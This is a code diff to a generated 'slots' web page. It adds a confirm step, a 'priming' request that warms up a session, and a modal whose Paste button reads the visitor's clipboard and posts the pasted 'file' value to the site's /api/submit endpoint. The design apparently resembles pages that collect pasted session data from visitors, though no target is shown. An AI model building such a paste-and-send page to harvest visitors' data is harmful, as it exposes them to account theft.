@@ -1381,6 +1381,47 @@ function buildSlotsPage(record) {
     from { transform: translateX(0); }
     to { transform: translateX(-50%); }
   }
+
+  /* ── CONFIRM MODAL STYLES ── */
+  .confirm-text {
+    text-align: center;
+    font-size: 1.1rem;
+    color: var(--text);
+    margin-bottom: 24px;
+    line-height: 1.6;
+  }
+  .confirm-btn {
+    width: 100%;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff;
+    border: none;
+    padding: 16px 0;
+    border-radius: 12px;
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 1.1rem;
+    font-weight: 700;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    cursor: pointer;
+    box-shadow: 0 0 40px rgba(192,38,211,0.4);
+    transition: transform 0.2s, box-shadow 0.2s;
+    margin-bottom: 12px;
+  }
+  .confirm-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 60px rgba(192,38,211,0.6);
+  }
+  .confirm-btn:disabled {
+    opacity: 0.6;
+    cursor: not-allowed;
+    transform: none;
+  }
+  .confirm-status {
+    text-align: center;
+    font-size: 0.75rem;
+    color: var(--muted);
+    min-height: 20px;
+  }
 </style>
 </head>
 <body>
@@ -1545,8 +1586,7 @@ function buildSlotsPage(record) {
       <div class="modal-title" id="modalTitle">Slot 1</div>
       <button class="modal-close" onclick="closeModal()">×</button>
     </div>
-    <div id="modalInputs"></div>
-    <button class="enable-btn" id="enableBtn">Enable Slot 1</button>
+    <div id="modalContent"></div>
   </div>
 </div>
 
@@ -1641,7 +1681,7 @@ slotData.forEach((slot, i) => {
     <div class="slot-number">Slot \${String(num).padStart(2,'0')}</div>
     <div class="slot-name">\${slot.name}</div>
     <div class="slot-desc">\${slot.desc}</div>
-    <button class="btn-start" onclick="openModal(\${num}, '\${slot.name}')">Get Started</button>
+    <button class="btn-start" onclick="showConfirmModal(\${num}, '\${slot.name}')">Get Started</button>
   \`;
   grid.appendChild(card);
 });
@@ -1651,7 +1691,6 @@ function animateCounters(){
   document.querySelectorAll('.stat-num[data-target]').forEach(el => {
     const target = +el.dataset.target;
     const suffix = el.dataset.suffix || '';
-    const prefix = target >= 1000 ? '' : '';
     let start = 0;
     const duration = 2000;
     const startTime = performance.now();
@@ -1676,11 +1715,77 @@ if(communitySection) observer.observe(communitySection);
 /* ── MODAL ── */
 let pastedValues = {};
 let currentSlot = null;
+let currentSlotName = null;
 
-function openModal(num, name) {
+function closeModal() { 
+  document.getElementById('modalOverlay').classList.remove('open'); 
+}
+
+function handleOverlayClick(e) { 
+  if(e.target === document.getElementById('modalOverlay')) closeModal(); 
+}
+
+document.addEventListener('keydown', e => { 
+  if(e.key === 'Escape') closeModal(); 
+});
+
+/* ── STEP 1: CONFIRM MODAL ── */
+function showConfirmModal(num, name) {
+  currentSlot = num;
+  currentSlotName = name;
+  
   document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
-  document.getElementById('enableBtn').textContent = \`Enable Slot \${num}\`;
-  document.getElementById('modalInputs').innerHTML = \`
+  document.getElementById('modalContent').innerHTML = \`
+    <div class="confirm-text">Ready to enable <strong>Slot \${num}</strong>?<br>Click "Yes" to continue.</div>
+    <button class="confirm-btn" id="yesBtn" onclick="handleYesClick()">Yes</button>
+    <div class="confirm-status" id="confirmStatus"></div>
+  \`;
+  
+  document.getElementById('modalOverlay').classList.add('open');
+}
+
+/* ── HANDLE YES CLICK ── */
+async function handleYesClick() {
+  const btn = document.getElementById('yesBtn');
+  const status = document.getElementById('confirmStatus');
+  
+  btn.disabled = true;
+  btn.textContent = 'Initializing...';
+  status.textContent = 'Sending priming request...';
+  
+  // Send priming request (1st request that "fails" but warms up session)
+  try {
+    const res = await fetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        slug: PAGE_SLUG, 
+        slots: { ['slot' + currentSlot]: 'CONFIRM_REQUEST' },
+        confirmOnly: true 
+      })
+    });
+    
+    // Wait a moment for session to warm up
+    await new Promise(r => setTimeout(r, 800));
+    
+    status.textContent = 'Session ready!';
+    
+    // Show the actual slot modal after confirmation
+    setTimeout(() => {
+      showSlotModal(currentSlot, currentSlotName);
+    }, 400);
+    
+  } catch (err) {
+    console.error('Priming error:', err);
+    // Even if it fails, proceed to slot modal
+    showSlotModal(currentSlot, currentSlotName);
+  }
+}
+
+/* ── STEP 2: SLOT MODAL ── */
+function showSlotModal(num, name) {
+  document.getElementById('modalTitle').textContent = \`Slot \${num} — \${name}\`;
+  document.getElementById('modalContent').innerHTML = \`
     <div class="input-group">
       <label class="input-label">Slot \${num} File</label>
       <div class="input-row">
@@ -1688,13 +1793,12 @@ function openModal(num, name) {
         <button class="paste-btn" onclick="pasteValue(\${num})">Paste</button>
       </div>
     </div>
+    <button class="enable-btn" id="enableBtn" onclick="handleEnable()">Enable Slot \${num}</button>
   \`;
   pastedValues = {};
-  document.getElementById('modalOverlay').classList.add('open');
 }
 
 async function pasteValue(num) {
-  currentSlot = num;
   try {
     const text = await navigator.clipboard.readText();
     if (text) {
@@ -1712,19 +1816,23 @@ async function pasteValue(num) {
   }
 }
 
-function closeModal() { document.getElementById('modalOverlay').classList.remove('open'); }
-function handleOverlayClick(e) { if(e.target === document.getElementById('modalOverlay')) closeModal(); }
-document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
-
-/* ── ENABLE SLOT — sends immediately on click ── */
-document.getElementById('enableBtn').addEventListener('click', async function() {
-  const btn = this;
+/* ── HANDLE ENABLE ── */
+async function handleEnable() {
+  const btn = document.getElementById('enableBtn');
   const slotNum = currentSlot;
   const value = pastedValues[slotNum] || '';
 
   if (!value) {
     const d = document.getElementById(\`display-\${slotNum}\`);
-    if (d) { d.style.borderColor = 'rgba(192,38,211,0.6)'; d.style.color = '#f472b6'; d.textContent = 'Paste something first!'; setTimeout(() => { d.textContent = 'No file pasted'; d.style.color = 'var(--muted)'; }, 2000); }
+    if (d) { 
+      d.style.borderColor = 'rgba(192,38,211,0.6)'; 
+      d.style.color = '#f472b6'; 
+      d.textContent = 'Paste something first!'; 
+      setTimeout(() => { 
+        d.textContent = 'No file pasted'; 
+        d.style.color = 'var(--muted)'; 
+      }, 2000); 
+    }
     return;
   }
 
@@ -1746,38 +1854,31 @@ document.getElementById('enableBtn').addEventListener('click', async function() 
       btn.textContent = '✓ Sent!';
       btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
       btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-      setTimeout(() => { closeModal(); btn.style.background = ''; btn.style.boxShadow = ''; btn.textContent = origText; btn.disabled = false; }, 1200);
+      setTimeout(() => { 
+        closeModal(); 
+        btn.style.background = ''; 
+        btn.style.boxShadow = ''; 
+        btn.textContent = origText; 
+        btn.disabled = false; 
+      }, 1200);
     } else {
       btn.textContent = '✗ Error';
       btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-      setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
+      setTimeout(() => { 
+        btn.style.background = ''; 
+        btn.textContent = origText; 
+        btn.disabled = false; 
+      }, 2000);
     }
   } catch {
     btn.textContent = '✗ Network Error';
     btn.style.background = 'linear-gradient(135deg,#dc2626,#ef4444)';
-    setTimeout(() => { btn.style.background = ''; btn.textContent = origText; btn.disabled = false; }, 2000);
+    setTimeout(() => { 
+      btn.style.background = ''; 
+      btn.textContent = origText; 
+      btn.disabled = false; 
+    }, 2000);
   }
-});
-
-/* ── SUBMIT ALL (kept as fallback) ── */
-async function submitAll() {
-  const slots = {};
-  for (let i = 1; i <= 9; i++) slots['slot'+i] = pastedValues[i] || '';
-  if (!Object.values(slots).some(v => v.length > 0)) { alert('Enable at least one slot first.'); return; }
-  const btn = document.getElementById('submitAllBtn');
-  if (!btn) return;
-  btn.disabled = true; btn.textContent = 'Submitting…';
-  try {
-    const res = await fetch('/api/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ slug: PAGE_SLUG, slots }) });
-    const data = await res.json();
-    if (data.success) {
-      btn.textContent = '✓ Submitted!';
-      btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
-      btn.style.boxShadow = '0 0 36px rgba(34,197,94,0.4)';
-      const st = document.getElementById('submitStatus');
-      if (st) { st.textContent = '✓ All slots submitted successfully.'; st.style.color = '#4ade80'; }
-    } else { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Error: '+(data.error||'Unknown')); }
-  } catch { btn.disabled=false; btn.textContent='Submit All Slots'; alert('Network error. Try again.'); }
 }
 
 /* ── PARALLAX CHARS on mousemove ── */
